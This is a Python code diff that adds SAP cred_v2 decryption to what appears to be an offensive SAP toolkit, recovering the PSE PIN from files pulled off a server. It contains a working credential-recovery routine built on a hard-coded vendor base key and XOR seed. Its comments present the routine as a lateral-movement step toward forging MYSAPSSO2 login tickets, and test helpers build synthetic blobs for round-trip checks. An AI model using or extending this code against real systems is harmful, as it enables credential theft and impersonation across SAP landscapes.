@@ -40,8 +40,10 @@ without a live SAP system.
 from __future__ import annotations
 
 import base64
+import hashlib
 import os
 import re
+import struct
 import time
 from typing import Callable, Optional
 
@@ -452,3 +454,641 @@ def extract_pse_bundle(gw_exec_fn: GwExecFn, sid: str,
                   f"-- bytes still available in returned dict")
 
     return result
+
+
+# ===================================================================
+# Commit 2 — cred_v2 decryption (PSE PIN recovery)
+# ===================================================================
+#
+# The cred_v2 file stores the PIN for the PSE file, encrypted with a
+# key derived from the OS username running the SAP workprocesses.
+# Any process running as <sid>adm can recover the PIN with zero
+# additional authentication — this is the lateral-movement gift that
+# makes MYSAPSSO2 ticket forgery possible.
+#
+# Two cipher format versions exist:
+#   - Format 0 (legacy): simple 3DES-CBC, key = format_string % user
+#   - Format 1 (modern): header with salt/IV, SHA-256 key derivation,
+#     3DES-CBC (algo=0) or AES-256-CBC (algo=1)
+#
+# The outer file is BER-encoded ASN.1: a SEQUENCE of credential
+# records, each containing the PSE path + encrypted cipher blob.
+# After decryption + LCG deobfuscation, the inner payload is also
+# BER-encoded: SEQUENCE { IA5String(pin) [, optional fields] }.
+#
+# Clean-room implementation based on public SAP documentation,
+# SAP Note 2115486, and the OWASP CBAS project's format description.
+# ===================================================================
+
+
+# ---------------------------------------------------------------------------
+# Minimal BER (Basic Encoding Rules) parser / builder
+# ---------------------------------------------------------------------------
+# Only handles the subset of ASN.1 used by cred_v2: SEQUENCE,
+# IA5String, UTF8String, INTEGER, BIT STRING, OCTET STRING.
+# No indefinite-length, no multi-byte tags, no SET sorting.
+
+_BER_INTEGER = 0x02
+_BER_BITSTRING = 0x03
+_BER_OCTETSTRING = 0x04
+_BER_IA5STRING = 0x16
+_BER_UTF8STRING = 0x0C
+_BER_SEQUENCE = 0x30
+_BER_SET = 0x31
+
+
+def _ber_read_tl(data: bytes, offset: int):
+    """Read one BER tag + length at *offset*.
+
+    Returns ``(tag, val_offset, val_len, next_offset)`` where
+    *val_offset* is the index of the first value byte and
+    *next_offset* is the first byte past this TLV.
+
+    Raises ``ValueError`` on truncated / malformed input.
+    """
+    if offset >= len(data):
+        raise ValueError(f"BER: offset {offset} past end of {len(data)}B")
+    tag = data[offset]
+    pos = offset + 1
+    if pos >= len(data):
+        raise ValueError("BER: truncated after tag byte")
+    first_len = data[pos]
+    pos += 1
+    if first_len < 0x80:
+        val_len = first_len
+    elif first_len == 0x80:
+        raise ValueError("BER: indefinite length not supported")
+    else:
+        n_bytes = first_len & 0x7F
+        if pos + n_bytes > len(data):
+            raise ValueError("BER: truncated length field")
+        val_len = int.from_bytes(data[pos:pos + n_bytes], "big")
+        pos += n_bytes
+    return tag, pos, val_len, pos + val_len
+
+
+def _ber_children(data: bytes, start: int, end: int):
+    """Yield ``(tag, value_bytes)`` for each TLV inside a constructed
+    element spanning ``data[start:end]``."""
+    pos = start
+    while pos < end:
+        tag, voff, vlen, nxt = _ber_read_tl(data, pos)
+        yield tag, data[voff:voff + vlen]
+        pos = nxt
+
+
+def _ber_encode_tl(tag: int, length: int) -> bytes:
+    """Encode a BER tag + length header (no value)."""
+    if length < 0x80:
+        return bytes([tag, length])
+    elif length < 0x100:
+        return bytes([tag, 0x81, length])
+    elif length < 0x10000:
+        return bytes([tag, 0x82, (length >> 8) & 0xFF, length & 0xFF])
+    else:
+        return bytes([tag, 0x83,
+                      (length >> 16) & 0xFF,
+                      (length >> 8) & 0xFF,
+                      length & 0xFF])
+
+
+def _ber_tlv(tag: int, value: bytes) -> bytes:
+    """Encode a complete TLV."""
+    return _ber_encode_tl(tag, len(value)) + value
+
+
+# ---------------------------------------------------------------------------
+# LCG-based XOR stream
+# ---------------------------------------------------------------------------
+# SAP's cred_v2 uses a Linear Congruential Generator as a
+# deterministic byte stream for XOR obfuscation.  The LCG parameters
+# match the classic Numerical Recipes / MINSTD constants hard-coded
+# in CommonCryptoLib.
+
+_LCG_MUL = 0x15A4E35
+_LCG_INC = 1
+
+
+def _lcg_xor(data: bytes, seed: int) -> bytes:
+    """XOR each byte of *data* with successive LCG outputs.
+
+    The LCG state advances *before* each byte:
+        state = (state * 0x15A4E35 + 1) mod 2^32
+        out[i] = data[i] ^ (state & 0xFF)
+
+    So the seed itself is never used directly as a key byte.
+    """
+    state = seed & 0xFFFFFFFF
+    out = bytearray(len(data))
+    for i in range(len(data)):
+        state = (state * _LCG_MUL + _LCG_INC) & 0xFFFFFFFF
+        out[i] = data[i] ^ (state & 0xFF)
+    return bytes(out)
+
+
+# ---------------------------------------------------------------------------
+# cred_v2 format constants
+# ---------------------------------------------------------------------------
+
+# Base key embedded in CommonCryptoLib (sapgenpse).  Contains a
+# literal ``%s`` at byte offset 14-15 that format-0 replaces with
+# the OS username via printf-style formatting.  Format-1 feeds the
+# raw bytes (including the ``%s``) into SHA-256 and incorporates the
+# username separately through the LCG-XOR step.
+_CRED_KEY_FMT = (b"240657rsga&/%srwthgrtawe45hhtrtrsr"
+                 b"35467b2dx3456j67mv67f89656f75")
+
+# Post-decryption XOR seed — applied after CBC decrypt to recover
+# the cleartext from the obfuscated intermediate.
+_POST_DECRYPT_SEED = 0x64FB914E
+
+
+# ---------------------------------------------------------------------------
+# cred_v2 outer envelope parser
+# ---------------------------------------------------------------------------
+
+class _CredRecord:
+    """One credential entry from the cred_v2 file."""
+    __slots__ = ("pse_path", "cipher_bytes", "is_lps", "raw_fields")
+
+    def __init__(self, pse_path: str, cipher_bytes: bytes,
+                 is_lps: bool = False, raw_fields: list = None):
+        self.pse_path = pse_path
+        self.cipher_bytes = cipher_bytes
+        self.is_lps = is_lps
+        self.raw_fields = raw_fields or []
+
+
+def _parse_cred_v2_envelope(blob: bytes) -> list:
+    """Parse the outer BER of a cred_v2 file into credential records.
+
+    The file is a BER SEQUENCE OF credential records.  Each record is
+    itself a SEQUENCE whose first child distinguishes the format:
+
+    **Non-LPS** (first child is IA5String):
+        ``SEQUENCE { IA5(name), IA5(?), IA5(pse_path), IA5(?), BITSTRING(cipher) }``
+
+    **LPS** (first child is INTEGER with value 2):
+        ``SEQUENCE { INT(2), SEQUENCE(subject), UTF8(pse_path), BITSTRING(cipher) }``
+
+    Returns a list of :class:`_CredRecord`.
+    """
+    records = []
+    # Outer wrapper is a SEQUENCE
+    tag, voff, vlen, _ = _ber_read_tl(blob, 0)
+    if tag != _BER_SEQUENCE:
+        raise ValueError(f"cred_v2: expected outer SEQUENCE (0x30), "
+                         f"got 0x{tag:02X}")
+
+    # Each child of the outer SEQUENCE is one credential record
+    for ctag, cval in _ber_children(blob, voff, voff + vlen):
+        if ctag != _BER_SEQUENCE:
+            continue  # skip unexpected elements
+        # Parse children of this credential SEQUENCE
+        children = list(_ber_children(cval, 0, len(cval)))
+        if not children:
+            continue
+
+        first_tag = children[0][0]
+        if first_tag == _BER_INTEGER:
+            # LPS variant
+            pse_path = ""
+            cipher_bytes = b""
+            for i, (t, v) in enumerate(children):
+                if t == _BER_UTF8STRING:
+                    pse_path = v.decode("utf-8", errors="replace")
+                elif t == _BER_BITSTRING:
+                    cipher_bytes = v[1:] if v and v[0] == 0 else v
+            records.append(_CredRecord(pse_path, cipher_bytes,
+                                       is_lps=True))
+        else:
+            # Non-LPS: expect IA5, IA5, IA5(path), IA5, BITSTRING
+            ia5_fields = []
+            cipher_bytes = b""
+            for t, v in children:
+                if t == _BER_IA5STRING:
+                    ia5_fields.append(
+                        v.decode("ascii", errors="replace"))
+                elif t == _BER_BITSTRING:
+                    # BIT STRING: first byte = unused-bit count (0)
+                    cipher_bytes = (v[1:] if v and v[0] == 0
+                                    else v)
+            pse_path = (ia5_fields[2] if len(ia5_fields) > 2
+                        else "")
+            records.append(_CredRecord(pse_path, cipher_bytes,
+                                       is_lps=False,
+                                       raw_fields=ia5_fields))
+    return records
+
+
+# ---------------------------------------------------------------------------
+# Key derivation + decryption
+# ---------------------------------------------------------------------------
+
+def _derive_and_decrypt_v0(cipher: bytes, username: str) -> bytes:
+    """Decrypt a format-0 (legacy, simple 3DES) cipher blob.
+
+    Key = ``(base_key_fmt % username)[:24]``, IV = 8 zero bytes.
+    """
+    try:
+        from cryptography.hazmat.primitives.ciphers import (
+            Cipher, modes)
+        try:
+            from cryptography.hazmat.decrepit.ciphers.algorithms \
+                import TripleDES
+        except ImportError:
+            from cryptography.hazmat.primitives.ciphers.algorithms \
+                import TripleDES
+    except ImportError as e:
+        raise RuntimeError(
+            f"cryptography library not available: {e}")
+
+    # printf-style: %s in the base key gets replaced with username
+    fmt_str = _CRED_KEY_FMT.decode("ascii")
+    key_material = (fmt_str % username).encode("ascii")
+    key = key_material[:24]
+    iv = b"\x00" * 8
+
+    # Pad to 3DES block size (8) if needed — shouldn't happen with
+    # well-formed blobs but be defensive
+    if len(cipher) % 8 != 0:
+        cipher = cipher + b"\x00" * (8 - len(cipher) % 8)
+
+    dec = Cipher(TripleDES(key), modes.CBC(iv)).decryptor()
+    return dec.update(cipher) + dec.finalize()
+
+
+def _derive_and_decrypt_v1(cipher_blob: bytes,
+                            username: str) -> bytes:
+    """Decrypt a format-1 (header-based) cipher blob.
+
+    The 36-byte header layout:
+        [0]       version (1)
+        [1]       algorithm: 0 = 3DES, 1 = AES-256
+        [2:4]     reserved (zeroes)
+        [4:20]    salt (16 bytes)
+        [20:36]   iv   (16 bytes)
+        [36:]     ciphertext
+
+    Key derivation:
+        sha256(base_key || blob[0:4] || salt ||
+               lcg_xor(username, salt[0]))
+        then lcg_xor(digest, salt[1]).
+    """
+    try:
+        from cryptography.hazmat.primitives.ciphers import (
+            Cipher, algorithms, modes)
+        try:
+            from cryptography.hazmat.decrepit.ciphers.algorithms \
+                import TripleDES
+        except ImportError:
+            from cryptography.hazmat.primitives.ciphers.algorithms \
+                import TripleDES
+    except ImportError as e:
+        raise RuntimeError(
+            f"cryptography library not available: {e}")
+
+    if len(cipher_blob) < 36:
+        raise ValueError(
+            "format-1 cipher blob too short for 36B header")
+
+    algo_byte = cipher_blob[1]
+    salt = cipher_blob[4:20]
+    iv_field = cipher_blob[20:36]
+    ciphertext = cipher_blob[36:]
+
+    # --- Key derivation via SHA-256 ---
+    user_bytes = username.encode("ascii")
+    xored_user = _lcg_xor(user_bytes, salt[0])
+
+    h = hashlib.sha256()
+    h.update(_CRED_KEY_FMT)       # full base key (including %s)
+    h.update(cipher_blob[0:4])    # version + algo + reserved
+    h.update(salt)                # 16-byte salt
+    h.update(xored_user)          # XOR'd username
+    digest = h.digest()           # 32 bytes
+
+    derived = _lcg_xor(digest, salt[1])
+
+    # --- Determine algorithm + actual IV/ciphertext ---
+    if algo_byte == 0:
+        # 3DES: iv_field[:8] is the actual IV;
+        # iv_field[8:] prepends ciphertext
+        actual_iv = iv_field[:8]
+        actual_ct = iv_field[8:] + ciphertext
+        key = derived[:24]
+        if len(actual_ct) % 8 != 0:
+            actual_ct += b"\x00" * (8 - len(actual_ct) % 8)
+        dec = Cipher(TripleDES(key),
+                     modes.CBC(actual_iv)).decryptor()
+    elif algo_byte == 1:
+        # AES-256-CBC: full 16-byte IV, full 32-byte key
+        actual_iv = iv_field
+        actual_ct = ciphertext
+        key = derived[:32]
+        if len(actual_ct) % 16 != 0:
+            actual_ct += b"\x00" * (16 - len(actual_ct) % 16)
+        dec = Cipher(algorithms.AES(key),
+                     modes.CBC(actual_iv)).decryptor()
+    else:
+        raise ValueError(
+            f"unsupported cipher algorithm byte: "
+            f"0x{algo_byte:02X}")
+
+    return dec.update(actual_ct) + dec.finalize()
+
+
+def _strip_pkcs5(data: bytes) -> bytes:
+    """Strip PKCS5/PKCS7 padding from decrypted CBC output.
+
+    Returns *data* unchanged if the trailing bytes don't look like
+    valid padding (defensive — real cred_v2 should always be padded).
+    """
+    if not data:
+        return data
+    pad_len = data[-1]
+    if pad_len < 1 or pad_len > 16:
+        return data
+    if len(data) < pad_len:
+        return data
+    if all(b == pad_len for b in data[-pad_len:]):
+        return data[:-pad_len]
+    return data
+
+
+def _decrypt_cipher_blob(cipher_bytes: bytes,
+                          username: str) -> bytes:
+    """Auto-detect format version and decrypt.
+
+    Returns the raw decrypted bytes (still XOR-obfuscated — caller
+    must apply post-decrypt XOR with ``_POST_DECRYPT_SEED``).
+    """
+    if not cipher_bytes:
+        raise ValueError("empty cipher blob")
+
+    # Format detection (matches CommonCryptoLib's logic):
+    # format-1 if blob >= 36 bytes and first byte is 0 or 1.
+    if len(cipher_bytes) >= 36 and cipher_bytes[0] in (0, 1):
+        return _derive_and_decrypt_v1(cipher_bytes, username)
+    else:
+        return _derive_and_decrypt_v0(cipher_bytes, username)
+
+
+def _extract_pin_from_plaintext(plain: bytes) -> str:
+    """Parse the BER-encoded decrypted payload to extract the PIN.
+
+    Expected structure:
+        ``SEQUENCE { IA5String(pin) [, IA5String(opt1) ...] }``
+
+    Falls back to raw Latin-1 decode if BER parsing fails — some
+    format-0 blobs store the PIN as a plain string without ASN.1.
+    """
+    # Try BER parse first
+    try:
+        tag, voff, vlen, _ = _ber_read_tl(plain, 0)
+        if tag == _BER_SEQUENCE:
+            for ctag, cval in _ber_children(
+                    plain, voff, voff + vlen):
+                if ctag in (_BER_IA5STRING, _BER_UTF8STRING,
+                            _BER_OCTETSTRING):
+                    enc = ("utf-8" if ctag == _BER_UTF8STRING
+                           else "ascii")
+                    pin = cval.decode(enc, errors="replace")
+                    return pin.rstrip("\x00")
+    except (ValueError, IndexError):
+        pass
+
+    # Fallback: first printable run
+    text = plain.decode("latin-1", errors="replace")
+    cleaned = "".join(c for c in text
+                      if 0x20 <= ord(c) < 0x7F)
+    return cleaned if cleaned else ""
+
+
+# ---------------------------------------------------------------------------
+# Public API — decrypt_cred_v2
+# ---------------------------------------------------------------------------
+
+def decrypt_cred_v2(cred_v2_bytes: bytes, sidadm_user: str,
+                    pse_path: Optional[str] = None) -> dict:
+    """Decrypt a cred_v2 file and recover the PSE PIN.
+
+    Args:
+        cred_v2_bytes: Raw cred_v2 file content (as extracted by
+                       :func:`extract_pse_bundle`).
+        sidadm_user:   OS username (e.g. ``"s4hadm"``) — the key
+                       derivation input.  Typically
+                       ``bundle["sidadm_user"]`` from commit 1.
+        pse_path:      Optional PSE path to match against.  When
+                       provided, only the credential whose
+                       ``pse_path`` field contains this substring
+                       is decrypted.  When ``None``, all non-LPS
+                       credentials are tried and the first
+                       successful decryption wins.
+
+    Returns:
+        ``{success, pin, pse_path, error, credentials}``
+
+        *pin* is the cleartext PSE PIN string on success.
+        *credentials* is a list of dicts describing every record
+        found in the file (for operator visibility).
+    """
+    result = {
+        "success": False,
+        "pin": "",
+        "pse_path": "",
+        "error": "",
+        "credentials": [],
+    }
+
+    if not cred_v2_bytes:
+        result["error"] = "empty cred_v2 blob"
+        return result
+
+    # Step 1: parse outer envelope
+    try:
+        records = _parse_cred_v2_envelope(cred_v2_bytes)
+    except (ValueError, IndexError) as e:
+        result["error"] = f"BER parse failed: {e}"
+        return result
+
+    if not records:
+        result["error"] = "no credential records found in cred_v2"
+        return result
+
+    # Surface all records for operator visibility
+    for rec in records:
+        result["credentials"].append({
+            "pse_path": rec.pse_path,
+            "cipher_len": len(rec.cipher_bytes),
+            "is_lps": rec.is_lps,
+        })
+
+    # Step 2: try to decrypt matching records
+    for rec in records:
+        if rec.is_lps:
+            continue  # LPS = DPAPI/TPM — not yet supported
+
+        if pse_path and pse_path not in rec.pse_path:
+            continue  # path filter — skip non-matching
+
+        if not rec.cipher_bytes:
+            continue
+
+        try:
+            raw_decrypted = _decrypt_cipher_blob(
+                rec.cipher_bytes, sidadm_user)
+        except Exception:
+            continue  # decryption failed — try next record
+
+        # Strip PKCS5/PKCS7 padding, then XOR deobfuscation
+        unpadded = _strip_pkcs5(raw_decrypted)
+        deobfuscated = _lcg_xor(unpadded,
+                                _POST_DECRYPT_SEED)
+
+        # Extract PIN from the cleartext
+        pin = _extract_pin_from_plaintext(deobfuscated)
+        if pin:
+            result["success"] = True
+            result["pin"] = pin
+            result["pse_path"] = rec.pse_path
+            return result
+
+    # No record yielded a valid PIN
+    lps_count = sum(1 for r in records if r.is_lps)
+    if lps_count == len(records):
+        result["error"] = (
+            f"all {lps_count} credential(s) use LPS "
+            f"(DPAPI/TPM) — not yet supported")
+    elif pse_path:
+        result["error"] = (
+            f"no credential matching path '{pse_path}' could "
+            f"be decrypted ({len(records)} record(s) in file)")
+    else:
+        result["error"] = (
+            f"decryption failed for all "
+            f"{len(records)} credential(s)")
+    return result
+
+
+# ---------------------------------------------------------------------------
+# Test helpers — cred_v2 blob builder (encrypt direction)
+# ---------------------------------------------------------------------------
+# In the main module so tests import them without duplicating the
+# BER / crypto logic.  They implement the *encryption* direction
+# (the reverse of decrypt_cred_v2) to construct synthetic cred_v2
+# blobs with known PINs for round-trip verification.
+
+def _build_cred_v2_blob(pin: str, pse_path: str,
+                         username: str, algo: int = 0,
+                         salt: bytes = None,
+                         iv: bytes = None) -> bytes:
+    """Build a synthetic cred_v2 file for testing.
+
+    Creates a single non-LPS credential record with the given PIN,
+    encrypted with the standard key derivation.
+
+    Args:
+        pin:      The PSE PIN to encrypt.
+        pse_path: PSE path for the credential record.
+        username: OS username for key derivation.
+        algo:     0 = 3DES (default), 1 = AES-256.
+        salt:     16-byte salt (random if ``None``).
+        iv:       16-byte IV (random if ``None``).
+
+    Returns:
+        The complete cred_v2 BER-encoded bytes.
+    """
+    # 1. Build inner plaintext: SEQUENCE { IA5String(pin) }
+    inner = _ber_tlv(_BER_SEQUENCE,
+                     _ber_tlv(_BER_IA5STRING,
+                              pin.encode("ascii")))
+
+    # 2. XOR obfuscation (pre-encrypt)
+    obfuscated = _lcg_xor(inner, _POST_DECRYPT_SEED)
+
+    # 3. Encrypt
+    cipher_bytes = _encrypt_for_cred_v2(
+        obfuscated, username, algo=algo, salt=salt, iv=iv)
+
+    # 4. Wrap in BER: credential record + outer SEQUENCE
+    record = _ber_tlv(_BER_SEQUENCE, b"".join([
+        _ber_tlv(_BER_IA5STRING, b"CN=test"),
+        _ber_tlv(_BER_IA5STRING, b""),
+        _ber_tlv(_BER_IA5STRING,
+                 pse_path.encode("ascii")),
+        _ber_tlv(_BER_IA5STRING, b""),
+        _ber_tlv(_BER_BITSTRING, b"\x00" + cipher_bytes),
+    ]))
+    return _ber_tlv(_BER_SEQUENCE, record)
+
+
+def _encrypt_for_cred_v2(plaintext: bytes, username: str,
+                           algo: int = 0, salt: bytes = None,
+                           iv: bytes = None) -> bytes:
+    """Encrypt plaintext using the cred_v2 format-1 scheme.
+
+    Returns the cipher blob (36-byte header + ciphertext).
+    Used by ``_build_cred_v2_blob`` for round-trip tests.
+    """
+    try:
+        from cryptography.hazmat.primitives.ciphers import (
+            Cipher, algorithms, modes)
+        try:
+            from cryptography.hazmat.decrepit.ciphers.algorithms \
+                import TripleDES
+        except ImportError:
+            from cryptography.hazmat.primitives.ciphers.algorithms \
+                import TripleDES
+    except ImportError as e:
+        raise RuntimeError(
+            f"cryptography library not available: {e}")
+
+    if salt is None:
+        salt = os.urandom(16)
+    if iv is None:
+        iv = os.urandom(16)
+
+    # Key derivation (same as _derive_and_decrypt_v1)
+    user_bytes = username.encode("ascii")
+    xored_user = _lcg_xor(user_bytes, salt[0])
+
+    h = hashlib.sha256()
+    h.update(_CRED_KEY_FMT)
+    h.update(bytes([1, algo, 0, 0]))
+    h.update(salt)
+    h.update(xored_user)
+    digest = h.digest()
+    derived = _lcg_xor(digest, salt[1])
+
+    # Build header
+    header = bytes([1, algo, 0, 0]) + salt + iv
+
+    if algo == 0:
+        # 3DES: only iv[:8] is the actual CBC IV.  The header's
+        # iv_field[8:16] stores the FIRST 8 bytes of ciphertext
+        # (the decrypt path reconstructs full ct as
+        # iv_field[8:] + blob[36:]).
+        actual_iv = iv[:8]
+        pad_len = 8 - (len(plaintext) % 8)
+        padded_plain = plaintext + bytes([pad_len]) * pad_len
+        key = derived[:24]
+        enc = Cipher(TripleDES(key),
+                     modes.CBC(actual_iv)).encryptor()
+        full_ct = enc.update(padded_plain) + enc.finalize()
+        # Split ciphertext: first block → header iv[8:], rest stored
+        header = (bytes([1, algo, 0, 0]) + salt +
+                  actual_iv + full_ct[:8])
+        return header + full_ct[8:]
+    elif algo == 1:
+        # AES-256-CBC
+        pad_len = 16 - (len(plaintext) % 16)
+        padded_plain = plaintext + bytes([pad_len]) * pad_len
+        key = derived[:32]
+        enc = Cipher(algorithms.AES(key),
+                     modes.CBC(iv)).encryptor()
+        ct = enc.update(padded_plain) + enc.finalize()
+    else:
+        raise ValueError(f"unsupported algo byte: {algo}")
+
+    return header + ct
